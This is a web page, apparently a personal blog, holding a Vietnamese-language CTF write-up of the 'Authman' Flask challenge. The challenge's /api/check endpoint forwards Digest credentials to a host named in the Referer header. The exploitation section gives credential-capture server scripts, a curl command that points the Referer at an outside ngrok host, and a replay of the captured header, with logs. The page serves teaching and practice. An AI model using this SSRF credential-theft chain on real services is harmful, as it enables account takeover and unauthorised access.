@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/p1c0L0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=p1c0L0.github.io/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>WRITEUP: AUTHMAN (BUCKEYE 2025) | p1c0L0</title>
+<meta name="keywords" content="">
+<meta name="description" content="WRITEUP: AUTHMAN (BUCKEYE 2025)
+
+
+
+Quick summary
+
+
+Đây là một web app Flask nhỏ
+
+
+Flag nằm ở /auth, được bảo vệ bằng HTTP Digest Auth
+
+
+Có một API check dùng Referer để tự gọi lại chính nó → đây là chỗ dị nhất, tiềm năng SSRF &#43; logic bug
+
+
+Cấu trúc file challenge
+
+authman/app/__init__.py – khởi tạo Flask app, cấu hình, HTTPDigestAuth
+
+from flask import Flask
+from flask_bootstrap import Bootstrap5
+from flask_httpauth import HTTPDigestAuth
+from config import FlaskConfig
+
+app = Flask(__name__)
+app.config.from_object(FlaskConfig)
+bootstrap = Bootstrap5(app)
+
+auth = HTTPDigestAuth()
+@auth.get_password
+def get_pw(uname):
+	return app.config[&#39;AUTH_USERS&#39;].get(uname,None)
+
+from app import routes
+
+
+authman/app/routes.py – định nghĩa các route /, /auth, /api/check">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/writeup_-authman-buckeye-2025/">
+<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.76a739ec9e19c0128deb6be5591d168c8e3b9a8640e14dc34a2f248f674ef884.css" integrity="sha256-dqc57J4ZwBKN62vlWR0WjI47moZA4U3DSi8kj2dO&#43;IQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/p1c0L0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/p1c0L0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/p1c0L0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/p1c0L0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/p1c0L0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/writeup_-authman-buckeye-2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="icon" type="image/png" sizes="32x32" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="shortcut icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/p1c0L0.github.io/" accesskey="h" title="p1c0L0 (Alt + H)">p1c0L0</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/ctf/" title="CTF">
+                    <span>CTF</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      WRITEUP: AUTHMAN (BUCKEYE 2025)
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="writeup-authman-buckeye-2025">WRITEUP: AUTHMAN (BUCKEYE 2025)<a hidden class="anchor" aria-hidden="true" href="#writeup-authman-buckeye-2025">#</a></h1>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1077UmxWl.png">
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HyobuIXxWg.png"></p>
+<hr>
+<h2 id="quick-summary">Quick summary<a hidden class="anchor" aria-hidden="true" href="#quick-summary">#</a></h2>
+<ul>
+<li>
+<p>Đây là một web app Flask nhỏ</p>
+</li>
+<li>
+<p>Flag nằm ở /auth, được bảo vệ bằng HTTP Digest Auth</p>
+</li>
+<li>
+<p>Có một API check dùng Referer để tự gọi lại chính nó → đây là chỗ dị nhất, tiềm năng SSRF + logic bug</p>
+</li>
+</ul>
+<p><strong>Cấu trúc file challenge</strong></p>
+<ul>
+<li><code>authman/app/__init__.py</code> – khởi tạo Flask app, cấu hình, HTTPDigestAuth</li>
+</ul>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">from flask import Flask
+from flask_bootstrap import Bootstrap5
+from flask_httpauth import HTTPDigestAuth
+from config import FlaskConfig
+
+app = Flask(__name__)
+app.config.from_object(FlaskConfig)
+bootstrap = Bootstrap5(app)
+
+auth = HTTPDigestAuth()
+@auth.get_password
+def get_pw(uname):
+	return app.config[&#39;AUTH_USERS&#39;].get(uname,None)
+
+from app import routes
+</code></pre><ul>
+<li>
+<p><code>authman/app/routes.py</code> – định nghĩa các route <code>/</code>, <code>/auth</code>, <code>/api/check</code></p>
+</li>
+<li>
+<p><code>authman/app/templates/*.html</code> – giao diện (index + trang flag)</p>
+</li>
+<li>
+<p><code>authman/config.py</code> – cấu hình secret key, user/pass, flag</p>
+</li>
+<li>
+<p><code>authman/main.py</code> – entry point Flask</p>
+</li>
+<li>
+<p><code>Dockerfile, docker-compose.yaml, requirements.txt</code> – dựng container</p>
+</li>
+</ul>
+<hr>
+<h2 id="phân-tích-sâu">Phân tích sâu<a hidden class="anchor" aria-hidden="true" href="#phân-tích-sâu">#</a></h2>
+<p><code>config.py</code></p>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">from secrets import token_urlsafe, token_hex
+import os
+
+class FlaskConfig:
+    SECRET_KEY = token_hex(32)
+    AUTH_USERS = {
+        &#34;keno&#34;: token_urlsafe(16),
+        &#34;tenk&#34;: token_urlsafe(16)
+    }
+    FLAG = os.environ.get(&#39;FLAG&#39;,&#39;bctf{fake_flag_for_testing}&#39;)
+</code></pre><ul>
+<li>
+<p><code>SECRET_KEY</code> -&gt; random mỗi lần container start.</p>
+</li>
+<li>
+<p><code>AUTH_USERS</code>:</p>
+<ul>
+<li>
+<p>Có 2 user: <code>keno</code>, <code>tenk</code></p>
+</li>
+<li>
+<p>Mật khẩu của từng user là chuỗi ngẫu nhiên (token_urlsafe(16) → không đoán nổi)</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>=&gt; password không cố định, không brute-force được</p>
+<p><code>app/__init__.py</code> Khởi tạo app và thiết lập Digest authentication</p>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">from flask import Flask
+from flask_bootstrap import Bootstrap5
+from flask_httpauth import HTTPDigestAuth
+from config import FlaskConfig
+
+app = Flask(__name__)
+app.config.from_object(FlaskConfig)
+bootstrap = Bootstrap5(app)
+
+auth = HTTPDigestAuth()
+@auth.get_password
+def get_pw(uname):
+    return app.config[&#39;AUTH_USERS&#39;].get(uname,None)
+
+from app import routes
+</code></pre><p><code>HTTPDigestAuth</code> được cấu hình với callback để lấy mật khẩu từ <code>AUTH_USERS</code>. <code>Flask-HTTPAuth</code> sử dụng <code>session Flask</code> (cookie) để lưu <code>nonce</code> và <code>opaque</code>, làm cho auth trở thành stateful. Điều này yêu cầu bao gồm <code>session cookie</code> đúng khi replay để xác thực <code>nonce</code></p>
+<p><code>routes.py</code> <strong>Có 3 endpoint</strong></p>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">@app.route(&#39;/&#39;,methods=[&#39;GET&#39;])
+def index():
+    return render_template(&#34;index.html&#34;)
+</code></pre><p><code>/</code> trả về <code>index.html</code>, trang home</p>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">@app.route(&#39;/auth&#39;,methods=[&#39;GET&#39;])
+@auth.login_required
+def auth():
+    return render_template(&#34;auth.html&#34;,flag=app.config[&#39;FLAG&#39;])
+</code></pre><p><code>/auth</code></p>
+<ul>
+<li>Được bảo vệ bởi <code>@auth.login_required</code></li>
+<li>Nếu auth thành công, render <code>render.html</code> và truyền biến flag=&hellip;..</li>
+</ul>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">@app.route(&#39;/api/check&#39;,methods=[&#39;GET&#39;])
+def check():
+    (user, pw), *_ = app.config[&#39;AUTH_USERS&#39;].items()
+    res = requests.get(r.referrer + &#39;/auth&#39;,
+        auth = HTTPDigestAuth(user,pw),
+        timeout=3
+    )
+    return jsonify({&#39;status&#39;:res.status_code})
+</code></pre><p><code>/api/check</code></p>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">(user, pw), *_ = app.config[&#39;AUTH_USERS&#39;].items()
+</code></pre><ul>
+<li><code>AUTH_USERS</code> là dict:</li>
+</ul>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">{&#34;keno&#34;: &lt;pw_ngẫu_nhiên&gt;, &#34;tenk&#34;: &lt;pw_ngẫu_nhiên&gt;}
+</code></pre><p><code>.items()</code> → list <code>[(user, pw), ...]</code></p>
+<p><code>(user, pw), *_ = ...</code> → lấy entry đầu tiên trong dict, tức là thường sẽ là <code>(&quot;keno&quot;, &lt;password_của_keno&gt;)</code></p>
+<p>Sau đó:</p>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">res = requests.get(
+    r.referrer + &#39;/auth&#39;,
+    auth = HTTPDigestAuth(user,pw),
+    timeout=3
+)
+return jsonify({&#39;status&#39;:res.status_code})
+</code></pre><ul>
+<li>
+<p>Lấy <code>r.referrer</code> (header <code>Referer</code> do client gửi lên)</p>
+</li>
+<li>
+<p>Gọi <code>requests.get(&lt;referrer&gt; + '/auth', auth=HTTPDigestAuth(user,pw))</code></p>
+</li>
+<li>
+<p>Trả về JSON: <code>{&quot;status&quot;: &lt;mã HTTP&gt;}</code></p>
+</li>
+</ul>
+<p>=&gt; <code>/api/check</code> là một “health-check API” kiểu: từ server, thử gọi đến <code>/auth</code> bằng <code>credentials</code> thật, nếu <code>status 200</code> → auth server đang chạy OK</p>
+<p><code>auth.html</code>
+Phần quan trọng:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">gg</span> <span style="color:#f92672">=</span> {{ <span style="color:#a6e22e">flag</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">tojson</span> }};
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">typingSpan</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gg</span>;
+</span></span></code></pre></div><ul>
+<li>Khi auth thành công, template nhận biến flag từ backend và hiển thị nó lên màn hình với hiệu ứng gõ chữ</li>
+</ul>
+<hr>
+<h2 id="root-cause-analysis">Root Cause Analysis<a hidden class="anchor" aria-hidden="true" href="#root-cause-analysis">#</a></h2>
+<ol>
+<li>
+<p><strong>Unvalidated User Input</strong>: Header <code>request.referrer</code> hoàn toàn do client (kẻ tấn công) kiểm soát, có thể đặt thành bất cứ giá trị nào.</p>
+</li>
+<li>
+<p><strong>Direct URL Construction</strong>: Code nối chuỗi <code>r.referrer + '/auth'</code> một cách MÙ QUÁNG, không xác thực, không lọc, không kiểm tra whitelist.</p>
+</li>
+<li>
+<p><strong>Credential Exposure</strong>: Server tự động đính kèm thông tin xác thực HTTP Digest hợp lệ (<code>user</code> và <code>pw</code>) vào yêu cầu gửi đi, bất kể đích đến là đâu.</p>
+</li>
+</ol>
+<hr>
+<h2 id="attack-vector">Attack Vector<a hidden class="anchor" aria-hidden="true" href="#attack-vector">#</a></h2>
+<pre tabindex="0"><code>[Attacker] → [Victim Server] → [Attacker-Controlled Server]
+                ↓
+        (sends credentials)
+</code></pre><p><strong>Attack flow:</strong></p>
+<ul>
+<li>Attacker gửi request GET tới <code>/api/check</code> kèm malicious <code>Referer</code> header</li>
+<li>Victim server đọc giá trị header <code>Referer</code></li>
+<li>Victim server gửi request HTTP tới <code>{Referer}/auth</code> kèm valid credentials</li>
+<li>Attacker server nhận request đã được xác thực và ghi log lại thông thông tin xác thực</li>
+<li>Attacker dùng crerdentials truy cập tới <code>/auth</code> endpoint và lấy FLAG</li>
+</ul>
+<hr>
+<h2 id="exploitation">EXPLOITATION<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
+<h3 id="step-1-set-up-credential-capture-server">Step 1: Set Up Credential Capture Server<a hidden class="anchor" aria-hidden="true" href="#step-1-set-up-credential-capture-server">#</a></h3>
+<p>Tạo một server Flask đơn giản để log các request đến:
+<code>capture.py</code></p>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">from flask import Flask, request
+import base64
+
+app = Flask(__name__)
+
+@app.route(&#39;/auth&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;, &#39;HEAD&#39;])
+def capture():
+    print(&#34;=&#34; * 60)
+    print(&#34;CAPTURED REQUEST:&#34;)
+    print(&#34;=&#34; * 60)
+    print(f&#34;Method: {request.method}&#34;)
+    print(f&#34;Headers:&#34;)
+    for header, value in request.headers:
+        print(f&#34;  {header}: {value}&#34;)
+    
+    # HTTP Digest Auth details will be in Authorization header
+    auth_header = request.headers.get(&#39;Authorization&#39;, &#39;&#39;)
+    if auth_header:
+        print(f&#34;\n🔑 AUTHENTICATION CAPTURED:&#34;)
+        print(f&#34;  {auth_header}&#34;)
+        
+        # Parse digest authentication parameters
+        if &#39;Digest&#39; in auth_header:
+            print(&#34;\n📋 Digest Auth Parameters:&#34;)
+            parts = auth_header.replace(&#39;Digest &#39;, &#39;&#39;).split(&#39;, &#39;)
+            for part in parts:
+                print(f&#34;  {part}&#34;)
+    
+    print(&#34;=&#34; * 60)
+    
+    # Return 401 to trigger authentication
+    return &#39;&#39;, 401, {&#39;WWW-Authenticate&#39;: &#39;Digest realm=&#34;test&#34;&#39;}
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;, port=8080, debug=True)
+</code></pre><p>Chạy server bắt credentials</p>
+<hr>
+<h3 id="step-2-exploit-the-ssrf-vulnerability">Step 2: Exploit the SSRF Vulnerability<a hidden class="anchor" aria-hidden="true" href="#step-2-exploit-the-ssrf-vulnerability">#</a></h3>
+<h4 id="sử-dụng-ngrok-không-cần-public-ip-siêu-rcm">Sử dụng ngrok (Không cần public ip) (siêu rcm)<a hidden class="anchor" aria-hidden="true" href="#sử-dụng-ngrok-không-cần-public-ip-siêu-rcm">#</a></h4>
+<h5 id="lý-do">Lý do:<a hidden class="anchor" aria-hidden="true" href="#lý-do">#</a></h5>
+<ul>
+<li>Cấp cho một public URL mà không cần ip public</li>
+<li>Tự động có HTTPS</li>
+<li>Có dashboard hiển thị chi tiết mọi request</li>
+</ul>
+<h5 id="install-ngrok">Install ngrok<a hidden class="anchor" aria-hidden="true" href="#install-ngrok">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   <span style="color:#75715e"># Download from https://ngrok.com/download</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Or via package manager:</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Windows (choco): choco install ngrok</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Mac (brew): brew install ngrok/ngrok/ngrok</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Linux (snap): snap install ngrok</span>
+</span></span></code></pre></div><h5 id="tạo-tunnel-ngrok">Tạo tunnel ngrok<a hidden class="anchor" aria-hidden="true" href="#tạo-tunnel-ngrok">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>  ngrok http <span style="color:#ae81ff">8080</span>
+</span></span></code></pre></div><p>Response:
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJVHO_XxWg.png"></p>
+<ul>
+<li>Copy URL ngrok (<code>https://unconsecrative-interaxial-mirtha.ngrok-free.dev</code>)</li>
+<li>Build và run docker compose up</li>
+</ul>
+<hr>
+<h5 id="khai-thác-ssrf">Khai thác SSRF<a hidden class="anchor" aria-hidden="true" href="#khai-thác-ssrf">#</a></h5>
+<p><strong>Truy cập tới <code>/auth</code> để lấy nonce, opaque, session</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>   <span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">v</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//localhost:5000/auth
+</span></span></span></code></pre></div><p>Response:</p>
+<pre tabindex="0"><code class="language-bash!" data-lang="bash!">* Host localhost:5000 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:5000...
+* Connected to localhost (::1) port 5000
+* using HTTP/1.x
+&gt; GET /auth HTTP/1.1
+&gt; Host: localhost:5000
+&gt; User-Agent: curl/8.15.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; HTTP/1.1 401 UNAUTHORIZED
+&lt; Server: Werkzeug/3.1.3 Python/3.12.12
+&lt; Date: Thu, 13 Nov 2025 15:32:51 GMT
+&lt; Content-Type: text/html; charset=utf-8
+&lt; Content-Length: 19
+&lt; WWW-Authenticate: Digest realm=&#34;Authentication Required&#34;,nonce=&#34;68dce582291c956b5613d2ae0e065ee5&#34;,opaque=&#34;75ecd94405f2e917b4cea85f544f9719&#34;,algorithm=&#34;MD5&#34;,qop=&#34;auth&#34;
+&lt; Vary: Cookie
+&lt; Set-Cookie: session=.eJwlyzsOwyAQBcC7bO0C8D5gc5kILw-58keKKyt3jyL3M7e067O-t31zykty7U7UlCy6IS_Ice6pMTBkkJDp8fvRzusfCujdVANGosWyqLNVDKgOK9Hk-wO1QRys.aRX6Iw.gvztvlOTt7zmkbCt-T4scvxsdVA; HttpOnly; Path=/
+&lt; Connection: close
+&lt; 
+* shutting down connection #0
+Unauthorized Access  
+</code></pre><ul>
+<li>Lấy từ response:
+<ul>
+<li><code>WWW-Authenticate: Digest realm=&quot;Authentication Required&quot;,nonce=&quot;68dce582291c956b5613d2ae0e065ee5&quot;,opaque=&quot;75ecd94405f2e917b4cea85f544f9719&quot;</code></li>
+<li><code>Set-Cookie: session=.eJwlyzsOwyAQBcC7bO0C8D5gc5kILw-58keKKyt3jyL3M7e067O-t31zykty7U7UlCy6IS_Ice6pMTBkkJDp8fvRzusfCujdVANGosWyqLNVDKgOK9Hk-wO1QRys.aRX6Iw.gvztvlOTt7zmkbCt-T4scvxsdVA</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>Chạy credential capture server cục bộ với nonce/opaque ở trên</strong>
+<code>capture.py</code></p>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">import http.server
+import socketserver
+
+class CaptureHandler(http.server.BaseHTTPRequestHandler):
+    challenged = False
+
+    def do_GET(self):
+        if self.path != &#39;/auth&#39;:
+            self.send_response(404)
+            self.end_headers()
+            return
+
+        if &#39;Authorization&#39; not in self.headers and not self.challenged:
+            self.challenged = True
+            self.send_response(401)
+            nonce = &#34;your_nonce&#34;  # Thay thế
+            opaque = &#34;your_opaque&#34;  # Thay thế
+            self.send_header(&#39;WWW-Authenticate&#39;, f&#39;Digest realm=&#34;Authentication Required&#34;, qop=&#34;auth&#34;, nonce=&#34;{nonce}&#34;, opaque=&#34;{opaque}&#34;&#39;)
+            self.end_headers()
+        else:
+            auth_header = self.headers.get(&#39;Authorization&#39;, &#39;No auth header&#39;)
+            print(f&#34;Captured Authorization header: {auth_header}&#34;)
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b&#34;OK - header captured&#34;)
+
+with socketserver.TCPServer((&#34;&#34;, 8000), CaptureHandler) as httpd:
+    print(&#34;Capture server running on http://localhost:8000&#34;)
+    httpd.serve_forever()
+</code></pre><p>rồi chạy <code>python3 capture.py</code>
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BkWfsOQe-x.png"></p>
+<hr>
+<p><strong>SSRF để capture header</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Referer: https://unconsecrative-interaxial-mirtha.ngrok-free.dev&#34;</span> http://localhost:5000/api/check
+</span></span></code></pre></div><p>=&gt; Trả về <code>{&quot;status&quot;:200}</code></p>
+<p>Log trong capture.py: Captured Authorization header: Digest &hellip; (copy chuỗi đầy đủ sau &ldquo;Digest &ldquo;).</p>
+<pre tabindex="0"><code class="language-bash!" data-lang="bash!">Capture server running on http://localhost:8000
+127.0.0.1 - - [13/Nov/2025 10:47:32] &#34;GET /auth HTTP/1.1&#34; 401 -
+Captured Authorization header: Digest username=&#34;keno&#34;, realm=&#34;Authentication Required&#34;, nonce=&#34;68dce582291c956b5613d2ae0e065ee5&#34;, uri=&#34;/auth&#34;, response=&#34;dc663a15c2d779051366cad3184716d6&#34;, opaque=&#34;75ecd94405f2e917b4cea85f544f9719&#34;, qop=&#34;auth&#34;, nc=00000001, cnonce=&#34;9fe57f06b5ccf275&#34;
+127.0.0.1 - - [13/Nov/2025 10:47:33] &#34;GET /auth HTTP/1.1&#34; 200 -
+</code></pre><hr>
+<p><strong>Replay header với session để lấy flag</strong></p>
+<pre tabindex="0"><code class="language-bash!" data-lang="bash!">curl -v -H &#39;Authorization: Digest &lt;captured_digest_string&gt;&#39; -H &#34;Cookie: session=&lt;session_above&gt;&#34; http://localhost:5000/auth
+</code></pre><p>Response (200 OK): <code>auth.html</code> với script chứa const gg = &ldquo;bctf{fake_flag_for_testing}&rdquo;;.</p>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HJc0pdmlbx.png"></p>
+<hr>
+<p><strong>FLAG: bctf{a_new_dog_learns_old_tricks}</strong></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/p1c0L0.github.io/">p1c0L0</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><canvas id="matrix-bg"></canvas>
+
+<style>
+     
+    #matrix-bg {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        z-index: -9999;  
+        pointer-events: none;
+    }
+
+     
+    .emoji-reset {
+         
+        font-family: "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji", "Android Emoji", sans-serif !important;
+        
+         
+        color: initial !important; 
+        
+         
+        background: none !important; 
+        -webkit-text-fill-color: initial !important; 
+        -webkit-background-clip: border-box !important;
+
+         
+        text-shadow: none !important; 
+        
+         
+        font-style: normal !important;
+        display: inline-block !important;
+        font-weight: normal !important;
+    }
+</style>
+
+<script>
+    
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
+    const fontSize = 14;
+    const columns = Math.ceil(window.innerWidth / fontSize);
+    const drops = Array(columns).fill(1);
+
+    function draw() {
+        
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        
+        ctx.fillStyle = 'rgba(0, 255, 65, 0.15)'; 
+        ctx.font = fontSize + 'px monospace';
+
+        for (let i = 0; i < drops.length; i++) {
+            const text = chars.charAt(Math.floor(Math.random() * chars.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                drops[i] = 0;
+            }
+            drops[i]++;
+        }
+    }
+    
+    
+    ctx.fillStyle = '#000000';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    setInterval(draw, 35);
+
+
+    
+    document.addEventListener("DOMContentLoaded", function() {
+        
+        function rescueEmojis(node) {
+            
+            if (node.nodeType === 3) { 
+                const text = node.nodeValue;
+                
+                const emojiRegex = /[\p{Emoji_Presentation}\p{Extended_Pictographic}\u{1F300}-\u{1F6FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu;
+                
+                if (text.match(emojiRegex)) {
+                    const span = document.createElement('span');
+                    
+                    span.innerHTML = text.replace(emojiRegex, '<span class="emoji-reset">$&</span>');
+                    node.parentNode.replaceChild(span, node);
+                }
+            } 
+            
+            else if (node.nodeType === 1 && 
+                     !['SCRIPT', 'STYLE', 'TEXTAREA', 'CODE', 'PRE'].includes(node.tagName) && 
+                     !node.classList.contains('emoji-reset')) {
+                Array.from(node.childNodes).forEach(child => rescueEmojis(child));
+            }
+        }
+        
+        
+        rescueEmojis(document.body);
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
